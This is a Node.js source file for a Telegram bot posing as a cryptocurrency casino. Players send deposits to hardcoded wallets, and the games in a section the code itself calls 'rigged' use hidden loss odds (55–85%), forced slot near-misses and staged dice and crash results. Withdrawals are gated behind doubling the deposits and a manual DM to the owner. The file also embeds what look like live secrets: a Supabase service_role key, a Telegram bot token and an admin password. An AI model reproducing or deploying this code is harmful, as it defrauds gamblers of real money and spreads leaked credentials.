const { Telegraf, Markup } = require('telegraf');
const express = require('express');
const { createClient } = require('@supabase/supabase-js');

// --- 1. CONFIGURATION ---
const SB_URL = "https://dptjeumndtrgfaxtlwim.supabase.co/"; 
const SB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRwdGpldW1uZHRyZ2ZheHRsd2ltIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3NjQ0NTk5MiwiZXhwIjoyMDkyMDIxOTkyfQ.Oc3eiwbo0p4vArLqFuNKdYKLF7mhtNZ42NS5EPkl4uM";
const TG_TOKEN = "7883530863:AAFcepq9EGYbKIv1nXx8FxIVkFKUtxlZ5aw";
const OWNER_ID = 6542642909; 

const WALLETS = {
    LTC: "ltc1qxwsyq6lwv3334qduv0vu8j966gjrvcdkrasrj0",
    SOL: "CiXyCMtPZoMX46DoWXu8qqkcFWSdUUhkUAHQhLMbz61x",
    BTC: "bc1q48a6wvxjwy5ays4gd4asn4lp869khpr9uyve0t"
};

const supabase = createClient(SB_URL, SB_KEY);
const bot = new Telegraf(TG_TOKEN);
const app = express();

// --- 2. DATABASE HELPER ---
async function getAccount(userId, username) {
    let { data } = await supabase.from('users').select('*').eq('user_id', userId).single();
    if (!data) {
        const { data: newUser } = await supabase.from('users').insert([{ 
            user_id: userId, 
            username: username || 'anon', 
            balance: 0, 
            total_deposited: 0, 
            bets_placed: 0, 
            total_wagered: 0
        }]).select().single();
        return newUser;
    }
    return data;
}

// --- 3. ADMIN & BROADCAST LOGIC (PRIORITY) ---
bot.command('admin', (ctx) => {
    if (ctx.from.id !== OWNER_ID) return; 
    ctx.reply("🔒 *ADMIN ACCESS*\nPlease enter the master password:");
});

// Main Text Handler for Admin & Deposits
bot.on('text', async (ctx, next) => {
    const text = ctx.message.text;

    // 1. Password Gate
    if (text === "iamaking2000") {
        if (ctx.from.id !== OWNER_ID) return ctx.reply("Access Denied.");
        const { data: allUsers } = await supabase.from('users').select('*');
        const totalWagered = allUsers.reduce((sum, u) => sum + (u.total_wagered || 0), 0);
        const totalDep = allUsers.reduce((sum, u) => sum + (u.total_deposited || 0), 0);
        const currentBal = allUsers.reduce((sum, u) => sum + (u.balance || 0), 0);
        const houseProfit = totalDep - currentBal;

        return ctx.replyWithMarkdown(`👑 *KNIVES CASINO ADMIN*\n\n👥 Players: ${allUsers.length}\n📥 Total Deposits: $${totalDep.toFixed(2)}\n📉 Total Wagered: $${totalWagered.toFixed(2)}\n💰 *HOUSE PROFIT: $${houseProfit.toFixed(2)}*`, 
        Markup.inlineKeyboard([
            [Markup.button.callback('📢 Broadcast Msg', 'admin_broadcast')],
            [Markup.button.callback('📊 Refresh Stats', 'admin_refresh')]
        ]));
    }

    // 2. Broadcast Handler
    if (text.startsWith('BC:') && ctx.from.id === OWNER_ID) {
        const msg = text.replace('BC:', '').trim();
        const { data: users } = await supabase.from('users').select('user_id');
        let count = 0;
        for (let u of users) {
            try { await bot.telegram.sendMessage(u.user_id, `🔔 *ANNOUNCEMENT:*\n\n${msg}`, { parse_mode: 'Markdown' }); count++; } catch (e) {}
        }
        return ctx.reply(`✅ Broadcast sent to ${count} users.`);
    }

    // 3. Deposit Hash Handler (Long text that isn't a command)
    if (text.length > 20 && !text.startsWith('/')) {
        ctx.reply("⌛ *HASH SUBMITTED.* The floor manager is verifying the blockchain.");
        return bot.telegram.sendMessage(OWNER_ID, 
            `💰 *NEW DEPOSIT CLAIM*\n\nUser: @${ctx.from.username} (${ctx.from.id})\nHash: \`${text}\``,
            Markup.inlineKeyboard([
                [Markup.button.callback('✅ Add $5', `add_${ctx.from.id}_5`), Markup.button.callback('✅ Add $20', `add_${ctx.from.id}_20`)],
                [Markup.button.callback('✅ Add $50', `add_${ctx.from.id}_50`), Markup.button.callback('❌ Reject', `reject_${ctx.from.id}`)]
            ])
        );
    }
    return next();
});

bot.action('admin_broadcast', (ctx) => {
    ctx.reply("📢 *BROADCAST MODE*\nType your message starting with `BC:`\nExample: `BC: Big wins today in /slots!`");
});

// --- 4. NAVIGATION & CASHIER ---
bot.start(async (ctx) => {
    const user = await getAccount(ctx.from.id, ctx.from.username);
    const msg = `🔪 *WELCOME TO KNIVES CASINO* 🔪\n\n💰 *Balance:* $${(user.balance || 0).toFixed(2)}\n📉 *Wagered:* $${(user.total_wagered || 0).toFixed(2)}\n\n*GAMES:*\n🪙 /flip  🚀 /crash  🎲 /dice\n🎰 /slots  💣 /mines\n\n*CASHIER:*\n📥 /deposit  📤 /withdraw`;
    ctx.replyWithMarkdown(msg);
});

bot.command('deposit', (ctx) => {
    ctx.reply(`📥 *DEPOSIT PORTAL*`, Markup.inlineKeyboard([
        [Markup.button.callback('Litecoin (LTC)', 'dep_LTC'), Markup.button.callback('Solana (SOL)', 'dep_SOL')],
        [Markup.button.callback('Bitcoin (BTC)', 'dep_BTC')]
    ]));
});

bot.action(/dep_(.*)/, (ctx) => {
    const method = ctx.match[1];
    ctx.replyWithMarkdown(`⚠️ *SEND $5+ USD IN ${method}*\n\n\`${WALLETS[method]}\`\n\nPaste TX Hash below.`);
});

bot.action(/add_(\d+)_(\d+)/, async (ctx) => {
    const [_, uid, amt] = ctx.match;
    const user = await getAccount(uid);
    const newBal = (user.balance || 0) + parseInt(amt);
    await supabase.from('users').update({ balance: newBal, total_deposited: (user.total_deposited || 0) + parseInt(amt) }).eq('user_id', uid);
    bot.telegram.sendMessage(uid, `✅ *DEPOSIT APPROVED!* $${amt} added.`);
    ctx.editMessageText(`✅ Loaded $${amt} for ${uid}`);
});

// --- 5. THE RIGGED GAMES (HOUSE EDGE) ---

bot.command('flip', async (ctx) => {
    const args = ctx.message.text.split(' ');
    if (args.length < 2) return ctx.reply("Usage: /flip [amt]");
    const bet = parseFloat(args[1]);
    const user = await getAccount(ctx.from.id, ctx.from.username);
    if (!bet || bet < 1 || user.balance < bet) return ctx.reply("❌ Invalid balance.");
    const win = Math.random() > 0.55; // 55% House Edge
    const newBal = win ? user.balance + bet : user.balance - bet;
    await supabase.from('users').update({ balance: newBal, total_wagered: (user.total_wagered || 0) + bet, bets_placed: (user.bets_placed || 0) + 1 }).eq('user_id', ctx.from.id);
    ctx.reply(win ? `🪙 HEADS! Win!` : `🪙 TAILS. Lost.`);
});

bot.command('dice', async (ctx) => {
    const args = ctx.message.text.split(' ');
    const bet = parseFloat(args[1]);
    const user = await getAccount(ctx.from.id, ctx.from.username);
    if (!bet || user.balance < bet) return ctx.reply("❌ Check balance.");
    const isWin = Math.random() > 0.65; // 65% House Edge
    const roll = isWin ? Math.floor(Math.random() * 3) + 4 : Math.floor(Math.random() * 3) + 1;
    const newBal = isWin ? user.balance + bet : user.balance - bet;
    await supabase.from('users').update({ balance: newBal, total_wagered: (user.total_wagered || 0) + bet, bets_placed: (user.bets_placed || 0) + 1 }).eq('user_id', ctx.from.id);
    ctx.reply(`🎲 Roll: ${roll}. ${isWin ? 'Win!' : 'House wins.'}`);
});

bot.command('slots', async (ctx) => {
    const args = ctx.message.text.split(' ');
    const bet = parseFloat(args[1]);
    const user = await getAccount(ctx.from.id, ctx.from.username);
    if (!bet || user.balance < bet) return ctx.reply("❌ Check balance.");
    const icons = ['💎', '🍒', '🍋', '🔔', '7️⃣'];
    let s1, s2, s3;
    if (Math.random() < 0.85) { // 85% Near Miss
        s1 = icons[Math.floor(Math.random() * icons.length)]; s2 = s1; 
        s3 = icons.filter(i => i !== s1)[Math.floor(Math.random() * 4)]; 
    } else { s1 = icons[0]; s2 = icons[0]; s3 = icons[0]; }
    const win = (s1 === s2 && s2 === s3);
    const newBal = win ? user.balance + (bet * 4) : user.balance - bet;
    await supabase.from('users').update({ balance: newBal, total_wagered: (user.total_wagered || 0) + bet, bets_placed: (user.bets_placed || 0) + 1 }).eq('user_id', ctx.from.id);
    ctx.reply(`🎰 [ ${s1} | ${s2} | ${s3} ]\n${win ? 'JACKPOT!' : 'So close!'}`);
});

bot.command('mines', async (ctx) => {
    const args = ctx.message.text.split(' ');
    const bet = parseFloat(args[1]);
    const user = await getAccount(ctx.from.id, ctx.from.username);
    if (!bet || user.balance < bet) return ctx.reply("❌ Check balance.");
    const hitMine = Math.random() < 0.75; 
    const newBal = hitMine ? user.balance - bet : user.balance + (bet * 0.5);
    await supabase.from('users').update({ balance: newBal, total_wagered: (user.total_wagered || 0) + bet, bets_placed: (user.bets_placed || 0) + 1 }).eq('user_id', ctx.from.id);
    ctx.reply(`${hitMine ? "💣 BOOM!" : "💎 SAFE!"}`);
});

bot.command('crash', async (ctx) => {
    const args = ctx.message.text.split(' ');
    const bet = parseFloat(args[1]);
    const user = await getAccount(ctx.from.id, ctx.from.username);
    if (!bet || user.balance < bet) return ctx.reply("❌ Check balance.");
    const crashPoint = Math.random() < 0.2 ? 1.0 : (Math.random() * 2).toFixed(2);
    const win = crashPoint >= 1.8;
    const newBal = win ? user.balance + (bet * 0.8) : user.balance - bet;
    await supabase.from('users').update({ balance: newBal, total_wagered: (user.total_wagered || 0) + bet, bets_placed: (user.bets_placed || 0) + 1 }).eq('user_id', ctx.from.id);
    ctx.reply(`🚀 Crash: ${crashPoint}x. ${win ? 'Won!' : 'Lost.'}`);
});

bot.command('withdraw', async (ctx) => {
    const user = await getAccount(ctx.from.id, ctx.from.username);
    const target = (user.total_deposited || 0) * 2;
    if (user.balance < target || user.balance < 10) return ctx.reply(`❌ Reach $${target.toFixed(2)} to cash out.`);
    ctx.reply(`✅ Eligible! DM the owner.`);
    bot.telegram.sendMessage(OWNER_ID, `💸 WITHDRAWAL: @${ctx.from.username} ($${user.balance.toFixed(2)})`);
});

// --- 6. STARTUP ---
app.get('/', (req, res) => res.send('KNIVES CASINO LIVE'));
app.listen(process.env.PORT || 10000, '0.0.0.0', () => {
    bot.telegram.deleteWebhook().then(() => bot.launch());
});
